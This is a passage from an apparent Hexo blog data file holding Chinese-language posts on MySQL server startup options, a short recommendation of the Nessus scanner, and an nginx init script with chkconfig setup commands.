-n。请注意你需要用root启动mysqld_safe来保证正确工作！\n--pid-file=path<br />进程ID文件的路径。\n--port=port_num<br />用来帧听TCP/IP连接的端口号。端口号必须为1024或更大值，除非MySQL以root系统用户运行。<br />每个mysqld的Unix套接字文件和TCP/IP端口号必须不同。\n--ledir=path<br />包含mysqld程序的目录的路径。使用该选项来显式表示服务器位置。\n--no-defaults<br />不要读任何选项文件。如果给出，必须首选该选项。\n--skip-character-set-client-handshake<br />忽略客户端发送的字符集信息，使用服务器的默认字符集。\n--socket=path<br />用于本地连接的Unix套接字文件。<br />每个mysqld的Unix套接字文件和TCP/IP端口号必须不同。\n--timezone=zone<br />为给定的选项值设置TZ时区环境变量。\n--user={user_name | user_id}<br />以用户名user_name或数字用户ID user_id运行mysqld服务器。<br />该&quot;用户&quot;指系统登录账户，而不是 授权表中的MySQL用户。\n<br />mysqld命令行选项<br />mysqld从[mysqld]和[server]组读取选项\n--ansi<br />使用标准(ANSI)SQL语法代替MySQL语法。\n--basedir=path, -b path<br />MySQL安装目录的路径。通常所有路径根据该路径来解析。\n--bootstrap<br />mysql_install_db脚本使用该选项来创建MySQL授权表，不需要启动MySQL服务器\n--console<br />将错误日志消息写入stderr和stdout，即使指定了--log-error。\n--character_sets_dir=path<br />字符集安装的目录。\n--chroot=path<br />通过chroot()系统调用在启动过程中将mysqld服务器放入一个封闭环境中。这是推荐的一个安全措施。请注意使用该选项可以 限制LOAD DATA INFILE和SELECT ... INTO OUTFILE。\n--character_set_server=charset<br />使用charset作为 默认服务器字符集。\n--core_file<br />如果mysqld终止，写内核文件。\n--datadir=path, -h path <br />数据目录的路径。\n--default_table_type=type<br />设置表的默认类型。\n--debug[=debug_options], -# [debug_options]<br />如果MySQL配置了--with-debug，你可以使用该选项来获得一个跟踪文件，跟踪mysqld正进行的操作。debug_options字符串通常为'd:t:o，file_name'。\n--default_time_zone=type<br />设置默认服务器时区。该选项设置全局time_zone系统变量。默认时区与系统时区相同(用system_time_zone系统变量值给定)\n--delay_key_write[= OFF | ON | ALL]<br />如何使用DELAYED KEYS选项。键写入延迟会造成再次写MyISAM表时键缓冲区不能被清空。该选项只适用MyISAM表。<br />OFF DELAY_KEY_WRITE被忽略。<br />ON MySQL在CREATE TABLE中用DELAY_KEY_WRITE选项。这是 默认值。<br />ALL 用启用DELAY_KEY_WRITE选项创建表的相同方法对所有新打开表的进行处理。<br />如果启用了DELAY_KEY_WRITE，说明使用该项的表的键缓冲区在每次更新索引时不被清空，只有关闭表时才清空。<br />但如果你使用该特性，你应用--myisam_recover选项启动服务器，为所有MyISAM表添加自动检查。\n--external_locking<br />用系统锁定。请注意如果你在lockd不能完全工作的系统上使用该选项(例如在Linux中)，mysqld容易死锁。<br />如果你在许多MySQL进程中使用该选项来更新MyISAM表，你必须确保满足下述条件：<br />使用正被另一个进程更新的表的查询的缓存不可使用。<br />不应在共享表中使用--delay-key-write=ALL或DELAY_KEY_WRITE=1。<br />最简单的方法是结合使用--external-locking和--delay-key-write=OFF --query-cache-size=0。<br />(默认不能实现，因为在许多设置中，结合使用上述选项很有用）。\n<br />--flush<br />执行SQL语句后向硬盘上清空更改。一般情况执行SQL语句后 MySQL向硬盘写入所有更改，让操作系统处理与硬盘的同步。\n<br />--init_file=file<br />启动时从该文件读SQL语句。每个语句必须在同一行中并且不应包括注释。\n<br />--language=lang_name, -L lang_name<br />用给定语言给出客户端错误消息。默认情况下，mysqld用英语给出错误消息。\n--large_pages<br />一些硬件/操作系统架构支持大于 默认值(通常4 KB)的内存页。实际支持取决于使用的硬件和OS。<br />大量访问内存的应用程序通过 使用较大的页，降低了Translation Lookaside Buffer (TLB)损失，可以改善性能。 <br />默认情况下该选项被禁用。\n---log[=file], -l [file]\n如果你想要知道mysqld内部发生了什么，你应该用--log[=file_name]或-l [file_name]选项启动它。如果没有给定file_name的值， 默认名是host_name.log。所有连接和语句被记录到日志文件。当你怀疑在客户端发生了错误并想确切地知道该客户端发送给mysqld的语句时，该日志可能非常有用。<br />mysqld按照它接收的顺序记录语句到查询日志。这可能与执行的顺序不同。\n--log_bin=[file]<br />二进制日志文件。将更改数据的所有查询记入该文件。用于备份和复制。<br />建议指定一个文件名,否则MySQL使用host_name-bin作为日志文件基本名。<br />运行服务器时若启用二进制日志则性能大约慢1%。\n--binlog_do_db=db_name<br />告诉主服务器，如果当前的数据库(即USE选定的数据库)是db_name，应将更新记录到二进制日志中。\n--binlog_ignore_db=db_name<br />告诉主服务器，如果当前的数据库(即USE选定的数据库)是db_name，不应将更新保存到二进制日志中。\n--log_error[=file]<br />该文件的日志错误和启动消息.<br />如果你不指定文件名，MySQL使用host_name.err作为文件名。如果文件名没有扩展名，则加上.err扩展名。\n<br />--log_isam[=file] <br />将所有MyISAM更改记入该文件\n--log_slow_queries[=file] <br />将所有执行时间超过long_query_time 秒的查询记入该文件。\n--log_warnings, -W<br />将警告例如Aborted connection...打印到错误日志。建议启用该选项，默认也是启用的。\n--memlock<br />将mysqld 进程锁定在内存中。请注意使用该选项时需要以root运行服务器，但从安全考虑并不是一个好注意。\n--myisam_recover [=option[,option...]]]<br />存储引擎MyISAM设置为恢复模式。该选项值是DEFAULT、BACKUP、FORCE或QUICK值的任何组合。<br />如果你指定多个值，用逗号","slug":"MySQL中my.cnf文件选项","published":1,"updated":"2023-04-22T05:38:44.670Z","_id":"clgrjlxi7004s7opifwsp21zj","comments":1,"layout":"post","photos":[],"link":"","content":"<p>MySQL中my.cnf文件选项<br /><br>mysqld服务器维护两种变量。全局变量影响服务器的全局操作。会话变量影响具体客户端连接相关操作。<br />可以在选项文件或命令行中设置全局变量。<br />用Set命令设置会话变量，当然它也可以设置全局变量。<br>就像oracle里面的初始化参数文件一样。下面是一些常用的选项说明，MySQL的管方文档上也有。</p><br /><br>如<br />mysql&gt; SET GLOBAL sort_buffer_size &#x3D; 10 * 1024 * 1024;<br />mysql&gt; SET SESSION sort_buffer_size &#x3D; 10 * 1024 * 1024;<br>如果你想用SET语句限制系统变量可设的最大值，可以在服务器启动时通过–maximum-var_name形式的选项来指定。<br />例如，要想防止query_cache_size的值运行时超过32MB，使用选项–maximum-query_cache_size&#x3D;32M。<br>mysqld_safe选项<br />–basedir&#x3D;path<br />MySQL安装目录的路径。<br>–core-file-size<br />mysqld能够创建的内核文件的大小。选项值传递给ulimit -c。<br>–datadir&#x3D;path<br />数据目录的路径。<br>–defaults-file&#x3D;path<br />读取的代替通用选项文件的选项文件名。如果给出，必须首选该选项。<br>–log-error&#x3D;path<br />将错误日志写入给定的文件。<br>-nice&#x3D;priority<br />使用nice程序根据给定值来设置服务器的调度优先级。<br>–open-files-limit&#x3D;count<br />mysqld能够打开的文件的数量。选项值传递给 ulimit -n。请注意你需要用root启动mysqld_safe来保证正确工作！<br>–pid-file&#x3D;path<br />进程ID文件的路径。<br>–port&#x3D;port_num<br />用来帧听TCP&#x2F;IP连接的端口号。端口号必须为1024或更大值，除非MySQL以root系统用户运行。<br />每个mysqld的Unix套接字文件和TCP&#x2F;IP端口号必须不同。<br>–ledir&#x3D;path<br />包含mysqld程序的目录的路径。使用该选项来显式表示服务器位置。<br>–no-defaults<br />不要读任何选项文件。如果给出，必须首选该选项。<br>–skip-character-set-client-handshake<br />忽略客户端发送的字符集信息，使用服务器的默认字符集。<br>–socket&#x3D;path<br />用于本地连接的Unix套接字文件。<br />每个mysqld的Unix套接字文件和TCP&#x2F;IP端口号必须不同。<br>–timezone&#x3D;zone<br />为给定的选项值设置TZ时区环境变量。<br>–user&#x3D;{user_name | user_id}<br />以用户名user_name或数字用户ID user_id运行mysqld服务器。<br />该&quot;用户&quot;指系统登录账户，而不是 授权表中的MySQL用户。<br><br />mysqld命令行选项<br />mysqld从[mysqld]和[server]组读取选项<br>–ansi<br />使用标准(ANSI)SQL语法代替MySQL语法。<br>–basedir&#x3D;path, -b path<br />MySQL安装目录的路径。通常所有路径根据该路径来解析。<br>–bootstrap<br />mysql_install_db脚本使用该选项来创建MySQL授权表，不需要启动MySQL服务器<br>–console<br />将错误日志消息写入stderr和stdout，即使指定了–log-error。<br>–character_sets_dir&#x3D;path<br />字符集安装的目录。<br>–chroot&#x3D;path<br />通过chroot()系统调用在启动过程中将mysqld服务器放入一个封闭环境中。这是推荐的一个安全措施。请注意使用该选项可以 限制LOAD DATA INFILE和SELECT … INTO OUTFILE。<br>–character_set_server&#x3D;charset<br />使用charset作为 默认服务器字符集。<br>–core_file<br />如果mysqld终止，写内核文件。<br>–datadir&#x3D;path, -h path <br />数据目录的路径。<br>–default_table_type&#x3D;type<br />设置表的默认类型。<br>–debug[&#x3D;debug_options], -# [debug_options]<br />如果MySQL配置了–with-debug，你可以使用该选项来获得一个跟踪文件，跟踪mysqld正进行的操作。debug_options字符串通常为’d:t:o，file_name’。<br>–default_time_zone&#x3D;type<br />设置默认服务器时区。该选项设置全局time_zone系统变量。默认时区与系统时区相同(用system_time_zone系统变量值给定)<br>–delay_key_write[&#x3D; OFF | ON | ALL]<br />如何使用DELAYED KEYS选项。键写入延迟会造成再次写MyISAM表时键缓冲区不能被清空。该选项只适用MyISAM表。<br />OFF DELAY_KEY_WRITE被忽略。<br />ON MySQL在CREATE TABLE中用DELAY_KEY_WRITE选项。这是 默认值。<br />ALL 用启用DELAY_KEY_WRITE选项创建表的相同方法对所有新打开表的进行处理。<br />如果启用了DELAY_KEY_WRITE，说明使用该项的表的键缓冲区在每次更新索引时不被清空，只有关闭表时才清空。<br />但如果你使用该特性，你应用–myisam_recover选项启动服务器，为所有MyISAM表添加自动检查。<br>–external_locking<br />用系统锁定。请注意如果你在lockd不能完全工作的系统上使用该选项(例如在Linux中)，mysqld容易死锁。<br />如果你在许多MySQL进程中使用该选项来更新MyISAM表，你必须确保满足下述条件：<br />使用正被另一个进程更新的表的查询的缓存不可使用。<br />不应在共享表中使用–delay-key-write&#x3D;ALL或DELAY_KEY_WRITE&#x3D;1。<br />最简单的方法是结合使用–external-locking和–delay-key-write&#x3D;OFF –query-cache-size&#x3D;0。<br />(默认不能实现，因为在许多设置中，结合使用上述选项很有用）。<br><br />–flush<br />执行SQL语句后向硬盘上清空更改。一般情况执行SQL语句后 MySQL向硬盘写入所有更改，让操作系统处理与硬盘的同步。<br><br />–init_file&#x3D;file<br />启动时从该文件读SQL语句。每个语句必须在同一行中并且不应包括注释。<br><br />–language&#x3D;lang_name, -L lang_name<br />用给定语言给出客户端错误消息。默认情况下，mysqld用英语给出错误消息。<br>–large_pages<br />一些硬件&#x2F;操作系统架构支持大于 默认值(通常4 KB)的内存页。实际支持取决于使用的硬件和OS。<br />大量访问内存的应用程序通过 使用较大的页，降低了Translation Lookaside Buffer (TLB)损失，可以改善性能。 <br />默认情况下该选项被禁用。<br>—log[&#x3D;file], -l [file]<br>如果你想要知道mysqld内部发生了什么，你应该用–log[&#x3D;file_name]或-l [file_name]选项启动它。如果没有给定file_name的值， 默认名是host_name.log。所有连接和语句被记录到日志文件。当你怀疑在客户端发生了错误并想确切地知道该客户端发送给mysqld的语句时，该日志可能非常有用。<br />mysqld按照它接收的顺序记录语句到查询日志。这可能与执行的顺序不同。<br>–log_bin&#x3D;[file]<br />二进制日志文件。将更改数据的所有查询记入该文件。用于备份和复制。<br />建议指定一个文件名,否则MySQL使用host_name-bin作为日志文件基本名。<br />运行服务器时若启用二进制日志则性能大约慢1%。<br>–binlog_do_db&#x3D;db_name<br />告诉主服务器，如果当前的数据库(即USE选定的数据库)是db_name，应将更新记录到二进制日志中。<br>–binlog_ignore_db&#x3D;db_name<br />告诉主服务器，如果当前的数据库(即USE选定的数据库)是db_name，不应将更新保存到二进制日志中。<br>–log_error[&#x3D;file]<br />该文件的日志错误和启动消息.<br />如果你不指定文件名，MySQL使用host_name.err作为文件名。如果文件名没有扩展名，则加上.err扩展名。<br><br />–log_isam[&#x3D;file] <br />将所有MyISAM更改记入该文件<br>–log_slow_queries[&#x3D;file] <br />将所有执行时间超过long_query_time 秒的查询记入该文件。<br>–log_warnings, -W<br />将警告例如Aborted connection…打印到错误日志。建议启用该选项，默认也是启用的。<br>–memlock<br />将mysqld 进程锁定在内存中。请注意使用该选项时需要以root运行服务器，但从安全考虑并不是一个好注意。<br>–myisam_recover [&#x3D;option[,option…]]]<br />存储引擎MyISAM设置为恢复模式。该选项值是DEFAULT、BACKUP、FORCE或QUICK值的任何组合。<br />如果你指定多个值，用逗号</p>\n","site":{"data":{}},"excerpt":"","more":"<p>MySQL中my.cnf文件选项<br /><br>mysqld服务器维护两种变量。全局变量影响服务器的全局操作。会话变量影响具体客户端连接相关操作。<br />可以在选项文件或命令行中设置全局变量。<br />用Set命令设置会话变量，当然它也可以设置全局变量。<br>就像oracle里面的初始化参数文件一样。下面是一些常用的选项说明，MySQL的管方文档上也有。</p><br /><br>如<br />mysql&gt; SET GLOBAL sort_buffer_size &#x3D; 10 * 1024 * 1024;<br />mysql&gt; SET SESSION sort_buffer_size &#x3D; 10 * 1024 * 1024;<br>如果你想用SET语句限制系统变量可设的最大值，可以在服务器启动时通过–maximum-var_name形式的选项来指定。<br />例如，要想防止query_cache_size的值运行时超过32MB，使用选项–maximum-query_cache_size&#x3D;32M。<br>mysqld_safe选项<br />–basedir&#x3D;path<br />MySQL安装目录的路径。<br>–core-file-size<br />mysqld能够创建的内核文件的大小。选项值传递给ulimit -c。<br>–datadir&#x3D;path<br />数据目录的路径。<br>–defaults-file&#x3D;path<br />读取的代替通用选项文件的选项文件名。如果给出，必须首选该选项。<br>–log-error&#x3D;path<br />将错误日志写入给定的文件。<br>-nice&#x3D;priority<br />使用nice程序根据给定值来设置服务器的调度优先级。<br>–open-files-limit&#x3D;count<br />mysqld能够打开的文件的数量。选项值传递给 ulimit -n。请注意你需要用root启动mysqld_safe来保证正确工作！<br>–pid-file&#x3D;path<br />进程ID文件的路径。<br>–port&#x3D;port_num<br />用来帧听TCP&#x2F;IP连接的端口号。端口号必须为1024或更大值，除非MySQL以root系统用户运行。<br />每个mysqld的Unix套接字文件和TCP&#x2F;IP端口号必须不同。<br>–ledir&#x3D;path<br />包含mysqld程序的目录的路径。使用该选项来显式表示服务器位置。<br>–no-defaults<br />不要读任何选项文件。如果给出，必须首选该选项。<br>–skip-character-set-client-handshake<br />忽略客户端发送的字符集信息，使用服务器的默认字符集。<br>–socket&#x3D;path<br />用于本地连接的Unix套接字文件。<br />每个mysqld的Unix套接字文件和TCP&#x2F;IP端口号必须不同。<br>–timezone&#x3D;zone<br />为给定的选项值设置TZ时区环境变量。<br>–user&#x3D;{user_name | user_id}<br />以用户名user_name或数字用户ID user_id运行mysqld服务器。<br />该&quot;用户&quot;指系统登录账户，而不是 授权表中的MySQL用户。<br><br />mysqld命令行选项<br />mysqld从[mysqld]和[server]组读取选项<br>–ansi<br />使用标准(ANSI)SQL语法代替MySQL语法。<br>–basedir&#x3D;path, -b path<br />MySQL安装目录的路径。通常所有路径根据该路径来解析。<br>–bootstrap<br />mysql_install_db脚本使用该选项来创建MySQL授权表，不需要启动MySQL服务器<br>–console<br />将错误日志消息写入stderr和stdout，即使指定了–log-error。<br>–character_sets_dir&#x3D;path<br />字符集安装的目录。<br>–chroot&#x3D;path<br />通过chroot()系统调用在启动过程中将mysqld服务器放入一个封闭环境中。这是推荐的一个安全措施。请注意使用该选项可以 限制LOAD DATA INFILE和SELECT … INTO OUTFILE。<br>–character_set_server&#x3D;charset<br />使用charset作为 默认服务器字符集。<br>–core_file<br />如果mysqld终止，写内核文件。<br>–datadir&#x3D;path, -h path <br />数据目录的路径。<br>–default_table_type&#x3D;type<br />设置表的默认类型。<br>–debug[&#x3D;debug_options], -# [debug_options]<br />如果MySQL配置了–with-debug，你可以使用该选项来获得一个跟踪文件，跟踪mysqld正进行的操作。debug_options字符串通常为’d:t:o，file_name’。<br>–default_time_zone&#x3D;type<br />设置默认服务器时区。该选项设置全局time_zone系统变量。默认时区与系统时区相同(用system_time_zone系统变量值给定)<br>–delay_key_write[&#x3D; OFF | ON | ALL]<br />如何使用DELAYED KEYS选项。键写入延迟会造成再次写MyISAM表时键缓冲区不能被清空。该选项只适用MyISAM表。<br />OFF DELAY_KEY_WRITE被忽略。<br />ON MySQL在CREATE TABLE中用DELAY_KEY_WRITE选项。这是 默认值。<br />ALL 用启用DELAY_KEY_WRITE选项创建表的相同方法对所有新打开表的进行处理。<br />如果启用了DELAY_KEY_WRITE，说明使用该项的表的键缓冲区在每次更新索引时不被清空，只有关闭表时才清空。<br />但如果你使用该特性，你应用–myisam_recover选项启动服务器，为所有MyISAM表添加自动检查。<br>–external_locking<br />用系统锁定。请注意如果你在lockd不能完全工作的系统上使用该选项(例如在Linux中)，mysqld容易死锁。<br />如果你在许多MySQL进程中使用该选项来更新MyISAM表，你必须确保满足下述条件：<br />使用正被另一个进程更新的表的查询的缓存不可使用。<br />不应在共享表中使用–delay-key-write&#x3D;ALL或DELAY_KEY_WRITE&#x3D;1。<br />最简单的方法是结合使用–external-locking和–delay-key-write&#x3D;OFF –query-cache-size&#x3D;0。<br />(默认不能实现，因为在许多设置中，结合使用上述选项很有用）。<br><br />–flush<br />执行SQL语句后向硬盘上清空更改。一般情况执行SQL语句后 MySQL向硬盘写入所有更改，让操作系统处理与硬盘的同步。<br><br />–init_file&#x3D;file<br />启动时从该文件读SQL语句。每个语句必须在同一行中并且不应包括注释。<br><br />–language&#x3D;lang_name, -L lang_name<br />用给定语言给出客户端错误消息。默认情况下，mysqld用英语给出错误消息。<br>–large_pages<br />一些硬件&#x2F;操作系统架构支持大于 默认值(通常4 KB)的内存页。实际支持取决于使用的硬件和OS。<br />大量访问内存的应用程序通过 使用较大的页，降低了Translation Lookaside Buffer (TLB)损失，可以改善性能。 <br />默认情况下该选项被禁用。<br>—log[&#x3D;file], -l [file]<br>如果你想要知道mysqld内部发生了什么，你应该用–log[&#x3D;file_name]或-l [file_name]选项启动它。如果没有给定file_name的值， 默认名是host_name.log。所有连接和语句被记录到日志文件。当你怀疑在客户端发生了错误并想确切地知道该客户端发送给mysqld的语句时，该日志可能非常有用。<br />mysqld按照它接收的顺序记录语句到查询日志。这可能与执行的顺序不同。<br>–log_bin&#x3D;[file]<br />二进制日志文件。将更改数据的所有查询记入该文件。用于备份和复制。<br />建议指定一个文件名,否则MySQL使用host_name-bin作为日志文件基本名。<br />运行服务器时若启用二进制日志则性能大约慢1%。<br>–binlog_do_db&#x3D;db_name<br />告诉主服务器，如果当前的数据库(即USE选定的数据库)是db_name，应将更新记录到二进制日志中。<br>–binlog_ignore_db&#x3D;db_name<br />告诉主服务器，如果当前的数据库(即USE选定的数据库)是db_name，不应将更新保存到二进制日志中。<br>–log_error[&#x3D;file]<br />该文件的日志错误和启动消息.<br />如果你不指定文件名，MySQL使用host_name.err作为文件名。如果文件名没有扩展名，则加上.err扩展名。<br><br />–log_isam[&#x3D;file] <br />将所有MyISAM更改记入该文件<br>–log_slow_queries[&#x3D;file] <br />将所有执行时间超过long_query_time 秒的查询记入该文件。<br>–log_warnings, -W<br />将警告例如Aborted connection…打印到错误日志。建议启用该选项，默认也是启用的。<br>–memlock<br />将mysqld 进程锁定在内存中。请注意使用该选项时需要以root运行服务器，但从安全考虑并不是一个好注意。<br>–myisam_recover [&#x3D;option[,option…]]]<br />存储引擎MyISAM设置为恢复模式。该选项值是DEFAULT、BACKUP、FORCE或QUICK值的任何组合。<br />如果你指定多个值，用逗号</p>\n"},{"title":"nessus 很好用","date":"2012-10-16T09:38:00.000Z","_content":"<p>今天安装了一下nessus，&nbsp;很好用，推荐一下，比较省事，UI非常棒，功能更没的说。晒几张图。</p><p><img src=\"/images/pic/e824b899a9014c080b9ea42a0a7b02087af4f49c.jpg\" width=\"640\" /></p><p><img src=\"/images/pic/9345d688d43f8794b377c4a1d21b0ef41ad53ab0.jpg\" width=\"640\" /></p><p><img src=\"/images/pic/0eb30f2442a7d933f82068fcad4bd11372f001b0.jpg\" width=\"640\" /></p><p><img src=\"/images/pic/86d6277f9e2f07087742a68fe924b899a801f2fe.jpg\" width=\"640\" /></p><p><img src=\"/images/pic/9825bc315c6034a8bd46340ecb1349540823769d.jpg\" width=\"640\" /></p><p><br /></p>","source":"_posts/nessus-很好用.md","raw":"title: nessus 很好用\ncategories: [网络安全]\ntags: []\ndate: 2012-10-16 17:38:00\n---\n<p>今天安装了一下nessus，&nbsp;很好用，推荐一下，比较省事，UI非常棒，功能更没的说。晒几张图。</p><p><img src=\"/images/pic/e824b899a9014c080b9ea42a0a7b02087af4f49c.jpg\" width=\"640\" /></p><p><img src=\"/images/pic/9345d688d43f8794b377c4a1d21b0ef41ad53ab0.jpg\" width=\"640\" /></p><p><img src=\"/images/pic/0eb30f2442a7d933f82068fcad4bd11372f001b0.jpg\" width=\"640\" /></p><p><img src=\"/images/pic/86d6277f9e2f07087742a68fe924b899a801f2fe.jpg\" width=\"640\" /></p><p><img src=\"/images/pic/9825bc315c6034a8bd46340ecb1349540823769d.jpg\" width=\"640\" /></p><p><br /></p>","slug":"nessus-很好用","published":1,"updated":"2023-04-22T05:38:44.847Z","_id":"clgrjlxi8004u7opi09mr7x92","comments":1,"layout":"post","photos":[],"link":"","content":"<p>今天安装了一下nessus，&nbsp;很好用，推荐一下，比较省事，UI非常棒，功能更没的说。晒几张图。</p><p><img src=\"/images/pic/e824b899a9014c080b9ea42a0a7b02087af4f49c.jpg\" width=\"640\" /></p><p><img src=\"/images/pic/9345d688d43f8794b377c4a1d21b0ef41ad53ab0.jpg\" width=\"640\" /></p><p><img src=\"/images/pic/0eb30f2442a7d933f82068fcad4bd11372f001b0.jpg\" width=\"640\" /></p><p><img src=\"/images/pic/86d6277f9e2f07087742a68fe924b899a801f2fe.jpg\" width=\"640\" /></p><p><img src=\"/images/pic/9825bc315c6034a8bd46340ecb1349540823769d.jpg\" width=\"640\" /></p><p><br /></p>","site":{"data":{}},"excerpt":"","more":"<p>今天安装了一下nessus，&nbsp;很好用，推荐一下，比较省事，UI非常棒，功能更没的说。晒几张图。</p><p><img src=\"/images/pic/e824b899a9014c080b9ea42a0a7b02087af4f49c.jpg\" width=\"640\" /></p><p><img src=\"/images/pic/9345d688d43f8794b377c4a1d21b0ef41ad53ab0.jpg\" width=\"640\" /></p><p><img src=\"/images/pic/0eb30f2442a7d933f82068fcad4bd11372f001b0.jpg\" width=\"640\" /></p><p><img src=\"/images/pic/86d6277f9e2f07087742a68fe924b899a801f2fe.jpg\" width=\"640\" /></p><p><img src=\"/images/pic/9825bc315c6034a8bd46340ecb1349540823769d.jpg\" width=\"640\" /></p><p><br /></p>"},{"title":"nginx自启动脚本","date":"2013-04-13T04:54:21.000Z","_content":"昨天晚上VPS重启了，NGINX没有起来。于是写了一下脚本，自启动的。\n<pre>\ncat /etc/init.d/nginx\n#!/bin/sh\n#\n# nginx       This shell script takes care of starting and stopping\n#               the nginx.\n#\n# chkconfig: - 64 36\n# description:  nginx.\n# processname: nginx\n# config: /usr/local/nginx/conf/nginx\n# pidfile: /usr/local/nginx/logs/nginx.pid\nif [ -f /etc/init.d/functions ]\nthen\n. /etc/init.d/functions\nelif [ -f /etc/rc.d/init.d/functions ]\nthen\n. /etc/rc.d/init.d/functions\nelse\nexit 0\nfi\nnginx=/usr/local/nginx/sbin/nginx\nconf=/usr/local/nginx/conf/nginx\nprog=nginx\nRETVAL=0\nstart() {\nif [ -n \"`/sbin/pidof $prog`\" ]\nthen\necho \"$prog: already running\"\nreturn 1\nfi\necho \"Starting $prog:\"\nbase=$prog\n$nginx\nif [ -z \"`/sbin/pidof $prog`\" ]\nthen\nRETVAL=1\nfi\nif [ $RETVAL -ne 0 ]\nthen\necho \"Startup failure\"\nelse\necho \"Startup success\"\nfi\nreturn $RETVAL\n}\nreload() {\nif [ -z \"`/sbin/pidof $prog`\" ]\nthen\nRETVAL=1\nfi\nif [ $RETVAL -ne 0 ]\nthen\necho \"nginx no have run\"\nelse\necho \"reload nginx config\"\n$nginx -s reload\nRETVAL=$?\nif [ $RETVAL -ne 0 ]\nthen\necho \"reload nginx config failure\"\nelse\necho \"reload nginx config success\"\nfi\nfi\n}\nstop() {\nif [ -z \"`/sbin/pidof $prog`\" ]\nthen\nRETVAL=1\nfi\nif [ $RETVAL -ne 0 ]\nthen\necho \"nginx no have run\"\nelse\necho \"Stopping $prog:\"\n$nginx -s stop\nRETVAL=$?\nif [ $RETVAL -ne 0 ]\nthen\necho \"Shutdown failure\"\nelse\necho \"Shutdown success\"\nfi\nfi\n}\ncase \"$1\" in\nstart)\nstart\n;;\nstop)\nstop\n;;\nstatus)\nstatus $nginx\nRETVAL=$?\n;;\nrestart)\nstop\nstart\n;;\nreload)\nreload\n;;\n*)\necho \"Usage: $prog {start|stop|restart|status|reload}\"\nexit 1\nesac\nexit $RETVAL\n添加权限和添加自启动\n[root@key1088 init.d]# chmod 755 nginx\n[root@key1088 init.d]# chkconfig --add nginx\n[root@key1088 init.d]# chkconfig --list nginx\nnginx           0:off   1:off   2:off   3:off   4:off   5:off   6:off\n[root@key1088 init.d]# chkconfig --level 235 nginx on\n[root@key1088 init.d]# chkconfig --list nginx\nnginx           0:off   1:off   2:on    3:on    4:off   5:on    6:off\n</pre>","source":"_posts/nginx自启动脚本.md","raw":"title: nginx自启动脚本\ncategories: [Shell编程]\ntags: [nginx;脚本]\ndate: 2013-04-13 12:54:21\n---\n昨天晚上VPS重启了，NGINX没有起来。于是写了一下脚本，自启动的。\n<pre>\ncat /etc/init.d/nginx\n#!/bin/sh\n#\n# nginx       This shell script takes care of starting and stopping\n#               the nginx.\n#\n# chkconfig: - 64 36\n# description:  nginx.\n# processname: nginx\n# config: /usr/local/nginx/conf/nginx\n# pidfile: /usr/local/nginx/logs/nginx.pid\nif [ -f /etc/init.d/functions ]\nthen\n. /etc/init.d/functions\nelif [ -f /etc/rc.d/init.d/functions ]\nthen\n. /etc/rc.d/init.d/functions\nelse\nexit 0\nfi\nnginx=/usr/local/nginx/sbin/nginx\nconf=/usr/local/nginx/conf/nginx\nprog=nginx\nRETVAL=0\nstart() {\nif [ -n \"`/sbin/pidof $prog`\" ]\nthen\necho \"$prog: already running\"\nreturn 1\nfi\necho \"Starting $prog:\"\nbase=$prog\n$nginx\nif [ -z \"`/sbin/pidof $prog`\" ]\nthen\nRETVAL=1\nfi\nif [ $RETVAL -ne 0 ]\nthen\necho \"Startup failure\"\nelse\necho \"Startup success\"\nfi\nreturn $RETVAL\n}\nreload() {\nif [ -z \"`/sbin/pidof $prog`\" ]\nthen\nRETVAL=1\nfi\nif [ $RETVAL -ne 0 ]\nthen\necho \"nginx no have run\"\nelse\necho \"reload nginx config\"\n$nginx -s reload\nRETVAL=$?\nif [ $RETVAL -ne 0 ]\nthen\necho \"reload nginx config failure\"\nelse\necho \"reload nginx config success\"\nfi\nfi\n}\nstop() {\nif [ -z \"`/sbin/pidof $prog`\" ]\nthen\nRETVAL=1\nfi\nif [ $RETVAL -ne 0 ]\nthen\necho \"nginx no have run\"\nelse\necho \"Stopping $prog:\"\n$nginx -s stop\nRETVAL=$?\nif [ $RETVAL -ne 0 ]\nthen\necho \"Shutdown failure\"\nelse\necho \"Shutdown success\"\nfi\nfi\n}\ncase \"$1\" in\nstart)\nstart\n;;\nstop)\nstop\n;;\nstatus)\nstatus $nginx\nRETVAL=$?\n;;\nrestart)\nstop\nstart\n;;\nreload)\nreload\n;;\n*)\necho \"Usage: $prog {start|stop|restart|status|reload}\"\nexit 1\nesac\nexit $RETVAL\n添加权限和添加自启动\n[root@key1088 init.d]# chmod 755 nginx\n[root@key1088 init.d]# chkconfig --add nginx\n[root@key1088 init.d]# chkconfig --list nginx\nnginx           0:off   1:off   2:off   3:off   4:off   5:off   6:off\n[root@key1088 init.d]# chkconfig --level 235 nginx on\n[root@key1088 init.d]# chkconfig --list nginx\nnginx           0:off   1:off   2:on    3:on    4:off   5:on    6:off\n</pre>","slug":"nginx自启动脚本","published":1,"updated":"2023-04-22T05:38:44.851Z","_id":"clgrjlxi9004w7opi2q6pdiox","comments":1,"layout":"post","photos":[],"link":"","content":"<p>昨天晚上VPS重启了，NGINX没有起来。于是写了一下脚本，自启动的。</p>\n<pre>\ncat /etc/init.d/nginx\n#!/bin/sh\n#\n# nginx       This shell script takes care of starting and stopping\n#               the nginx.\n#\n# chkconfig: - 64 36\n# description:  nginx.\n# processname: nginx\n# config: /usr/local/nginx/conf/nginx\n# pidfile: /usr/local/nginx/logs/nginx.pid\nif [ -f /etc/init.d/functions ]\nthen\n. /etc/init.d/functions\nelif [ -f /etc/rc.d/init.d/functions ]\nthen\n. /etc/rc.d/init.d/functions\nelse\nexit 0\nfi\nnginx=/usr/local/nginx/sbin/nginx\nconf=/usr/local/nginx/conf/nginx\nprog=nginx\nRETVAL=0\nstart() {\nif [ -n \"`/sbin/pidof $prog`\" ]\nthen\necho \"$prog: already running\"\nreturn 1\nfi\necho \"Starting $prog:\"\nbase=$prog\n$nginx\nif [ -z \"`/sbin/pidof $prog`\" ]\nthen\nRETVAL=1\nfi\nif [ $RETVAL -ne 0 ]\nthen\necho \"Startup failure\"\nelse\necho \"Startup success\"\nfi\nreturn $RETVAL\n}\nreload() {\nif [ -z \"`/sbin/pidof $prog`\" ]\nthen\nRETVAL=1\nfi\nif [ $RETVAL -ne 0 ]\nthen\necho \"nginx no have run\"\nelse\necho \"reload nginx config\"\n$nginx -s reload\nRETVAL=$?\nif [ $RETVAL -ne 0 ]\nthen\necho \"reload nginx config failure\"\nelse\necho \"reload nginx config success\"\nfi\nfi\n}\nstop() {\nif [ -z \"`/sbin/pidof $prog`\" ]\nthen\nRETVAL=1\nfi\nif [ $RETVAL -ne 0 ]\nthen\necho \"nginx no have run\"\nelse\necho \"Stopping $prog:\"\n$nginx -s 